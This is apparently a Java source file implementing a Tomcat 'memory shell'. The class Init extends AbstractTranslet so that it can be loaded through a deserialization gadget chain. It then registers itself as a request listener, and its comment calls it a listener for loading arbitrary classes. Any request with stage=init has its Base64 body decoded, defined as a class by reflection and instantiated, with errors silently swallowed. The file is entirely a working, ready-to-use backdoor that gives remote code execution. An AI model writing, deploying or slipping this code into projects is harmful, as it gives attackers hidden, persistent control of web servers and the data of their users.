package ccdr4gon;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

//注入一个用来加载任意类的listener
public class Init extends AbstractTranslet implements ServletRequestListener  {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    public Init() throws Exception {
        super();
        super.namesArray = new String[]{"ccdr4gon"};
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
        standardCtx.addApplicationEventListener(this);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            RequestFacade requestfacade= (RequestFacade) sre.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            if (request.getParameter("stage").equals("init")) {
                StringBuilder sb = new StringBuilder("");
                BufferedReader br = request.getReader();
                String str;
                while ((str = br.readLine()) != null) {
                    sb.append(str);
                }
                byte[] payload = Base64.getDecoder().decode(sb.toString());
                Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
                clazz.newInstance();
            }
        }catch (Exception ignored){}
    }
}
